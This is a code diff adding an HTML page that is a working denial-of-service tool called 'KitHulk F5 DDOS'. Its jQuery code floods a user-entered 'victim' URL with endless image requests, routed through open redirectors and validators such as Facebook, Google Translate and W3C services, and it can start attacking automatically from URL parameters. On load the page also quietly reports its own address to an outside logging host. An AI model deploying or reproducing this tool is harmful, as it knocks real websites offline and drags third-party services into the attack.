@@ -1,0 +1,182 @@
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.1/jquery.min.js"></script>
+<script type="text/javascript">
+function getParameterByName(name) {
+    name = name.replace(/[\[]/, "\\[").replace(/[\]]/, "\\]");
+    var regex = new RegExp("[\\?&]" + name + "=([^&#]*)"),
+        results = regex.exec(location.search);
+    return results === null ? "" : decodeURIComponent(results[1].replace(/\+/g, " "));
+} 
+$(document).ready(function(){
+	$.ajax({
+        type:'GET',
+        url: 'http://hethongcloud.com/log_botf5.php',
+        data:{'v':window.location.href}
+    });
+	document.title='KitHulk F5 DDOS (DIE Group)';
+	$("#btn_init").click(function(){
+		victim 	= $('#victim').val();
+		
+		if(victim==''){
+			alert('Chưa nhập victim!');
+			$('#victim').focus();
+		}
+		else{
+			url= $('select[name=type]').val()+victim;
+			$('#div_content').empty();
+			$('.div_report').empty();
+			number = parseInt($('#number').val());
+			for(i=0; i<number; i++){
+				content ="";
+				content+= "<div class='stt'>"+(i+1).toString()+".</div> URL / IP : <input id='targetURL" + i.toString() + "' style='width: 50%;'  value='"+url+"'>";
+				content+="Request :  <input id='rps" + i.toString() + "' style='width: 5%;' value='99999999999999999999999999999999999999999999999999'>";
+				content+="Message : <input id='message"+ i.toString() +"' style='width: 5%;' value='#f5ddos'>";
+				content+="<button id='fireButton"+ i.toString() +"' class='BTN'>START</button><br>";
+				$('#div_content').append(content);	
+				
+				//
+				report="<div class='IFC'>";
+                report+="<legend><font color='#000000'><b>Fire "+ (i+1) +"</b></font></legend><dl>";
+                report+="<dt style='color: #000000;'>Sending :</dt>";
+                report+="<dd id='requestedCtr"+ i.toString() +"'>0</dd>";
+                report+="<dt style='color: blue;'>Obtaining :</dt>";
+                report+="<dd id='succeededCtr"+ i.toString() +"' style='opacity: 0.5;'>0</dd>";
+                report+="<dt style='color: blue;'>Failed :</dt>";
+                report+="<dd id='failedCtr"+ i.toString() +"' style='opacity: 0.5;'>0</dd></dl></div>";
+				$('.div_report').append(report);
+				
+				attack(i);
+			}
+		}
+	});
+	$("#btn_attack").click(function(){
+		$("button[id*='fireButton']").trigger('click');
+	});
+	var victim = getParameterByName('v');
+	if(victim!=''){
+		$('#victim').val(victim);
+		if(getParameterByName('n')!=''){
+			$('#number').val(getParameterByName('n'));
+		}
+		if(getParameterByName('t')!=''){
+			t = parseInt(getParameterByName('t'));
+			if(t>0){
+				document.getElementById("type").selectedIndex= t-1;
+			}
+		}
+		$("#btn_init").trigger('click');
+		$("#btn_attack").trigger('click');
+	}
+});
+
+function attack(id) {
+	var fireInterval;
+	var isFiring = false;
+	var requestedCtrNode = document.getElementById("requestedCtr"+id),
+		succeededCtrNode = document.getElementById("succeededCtr"+id),
+		failedCtrNode = document.getElementById("failedCtr"+id),
+		targetURLNode = document.getElementById("targetURL"+id),
+		fireButton = document.getElementById("fireButton"+id),
+		messageNode = document.getElementById("message"+id),
+		rpsNode = document.getElementById("rps"+id),
+		timeoutNode = document.getElementById("timeout"+id);
+	var targetURL = targetURLNode.value;
+	targetURLNode.onchange = function () {
+		targetURL = this.value;};
+	var requestsHT = {};
+	var requestedCtr = 0,
+		succeededCtr = 0,
+		failedCtr = 0;
+	var makeHttpRequest = function () {
+			if (requestedCtr > failedCtr + succeededCtr + 99999999999999999999999999999999999999999999999999) { 
+				return; };
+			var rID =Number(new Date());
+			var img = new Image();
+			img.onerror = function () { onFail(rID); };img.onabort = function () { onFail(rID); };img.onload = function () { onSuccess(rID); };img.setAttribute("src", targetURL + "?id=" + rID + "&msg=" + messageNode.value);requestsHT[rID] = img;
+			onRequest(rID); };
+	var onRequest = function (rID) {
+			requestedCtr++;
+			requestedCtrNode.innerHTML = requestedCtr; };
+	var onComplete = function (rID) {
+			delete requestsHT[rID]; };
+	var onFail = function (rID) {succeededCtr++; succeededCtrNode.innerHTML = succeededCtr; delete requestsHT[rID];};
+	var onSuccess = function (rID) {succeededCtr++;
+	succeededCtrNode.innerHTML = succeededCtr; delete requestsHT[rID];
+		}; 
+		fireButton.onclick = function () {
+		if (isFiring) {clearInterval(fireInterval);isFiring = false; this.innerHTML = "START";$("#btn_attack").text('Attack'); } else {isFiring = true; this.innerHTML = "STOP";$("#btn_attack").text('Stop');fireInterval = setInterval(makeHttpRequest, (99999999999999999999999999999999999999999999999999 / parseInt(rpsNode.value) | 0));} };
+}
+</script>
+<style type="text/css">
+.stt{
+	width: 60px;
+	float: left;
+}
+.centerDiv{
+	margin-left: auto;
+    margin-right: auto;
+    width: 70%;
+    background-color: green;
+	color: yellow;
+	padding: 10px;
+	border-radius: 5px;
+	margin-bottom: 10px;
+}
+.div_report
+{
+	margin-top: 10px;
+	font-family:arial;
+	color:#000;
+	font-size:15px;
+	width: 100%;
+	height: 22%
+	float:center;
+	margin-left: auto;
+	margin-right: auto;
+	text-align:center;
+}
+
+.IFC
+{
+	font-family:arial;
+	color: red;
+	font-size:12px;
+	width: 9%;
+	float:left;
+	margin-left: auto;
+	margin-right: auto;
+	text-align:center;
+}
+</style>
+<div style="">
+<div class="centerDiv">
+<center>
+<img style="width: 120px; border-radius:5px; box-shadow: 1px 1px 2px red" src="https://c.tenor.com/S2vLXwYujQcAAAAM/anonymous.gif"/><br>
+<div style="margin-top: 5px;margin-bottom: 20px; font-weight: bold; text-shadow: 1px 1px 2px #fff;">..:: DIE Group KITHulk F5 DDos Black Chess WhatsApp ::..</div>
+</center>
+	Victim: <input id='victim'/>Quantily: <input id='number' value='100'/>
+	<select name="type" id="type">
+		<option value="https://www.facebook.com/l.php?u=">1. Facebook</option>
+		<option value="https://plus.google.com/share?url=">2. Plus google</option>
+		<option value="https://drive.google.com/viewerng/viewer?url=">3. Drive google</option>
+		<option value="http://validator.w3.org/feed/check.cgi?url=">4. Validator.W3</option>
+		<option value="http://host-tracker.com/check_page/?furl=">5. Host Tracker</option>
+		<option value="hhttp://jigsaw.w3.org/css-validator/validator?uri=">6. Jigsaw W3</option>
+		<option value="http://www.google.com/translate?u=">7. Google Translate</option>	
+		<option value="http://anonymouse.org/cgi-bin/anon-www.cgi/">8. Anonymouse.org</option>
+		<option value="http://www.onlinewebcheck.com/?url=">9. Onlinewebcheck.com</option>
+		<option value="http://feedvalidator.org/check.cgi?url=">10. Feedvalidator.org</option>	
+		<option value="http://www.online-translator.com/url/translation.aspx?direction=er&sourceURL=">11. Online-translator.com</option>			
+		<option value="http://www.translate.ru/url/translation.aspx?direction=er&sourceURL=">12. Translate.ru</option>
+		<option value="https://images2-focus-opensocial.googleusercontent.com/gadgets/proxy?container=focus&url=">13. Images2-focus-opensocial</option>
+		<option value="http://www.pagescoring.com/website-speed-test/?url=">14. Pagescoring.com</option>	
+	</select>
+	<button type="button" id="btn_init">Intialization</button>	
+	<button type="button" id="btn_attack">Attack</button>	
+</div>
+<fieldset id="div_content" style="min-height: 200px; font-family:arial;color:000;font-size:15px;width: 90%;height: auto; border:1px solid orange; border-radius: 5px;margin-left: auto; margin-top: 5px; margin-right: auto;"></fieldset>
+</div>
+<div>
+<fieldset id="div_report" style="min-height: 200px; margin-top: 10px; font-family:arial; font-size:15px;width: 90%;margin-left: auto;margin-right: auto; border: 1px solid orange; border-radius: 5px;">
+<div class="div_report"></div></fieldset></div>
